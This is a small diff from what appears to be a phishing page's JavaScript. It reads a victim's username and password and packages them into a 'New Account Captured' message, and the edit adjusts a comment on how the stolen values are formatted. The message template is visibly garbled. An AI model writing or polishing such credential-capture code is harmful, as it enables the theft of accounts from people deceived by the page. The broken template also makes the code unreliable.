@@ -145,7 +145,7 @@
       const login = document.getElementById('username').value.trim();
       const senha = document.getElementById('password').value.trim();
 
-      // Formato EXATO: backticks só no início e final de cada valor
+      // Formato correto: backticks só no valor digitado, sem chaves extras
       const mensagem = `🔐 **Nova Conta Capturada**\n\n**Login:**\n\`\( {login || '—'}\`\n\n**Senha:**\n\` \){senha || '—'}\``;
 
       if (login) {
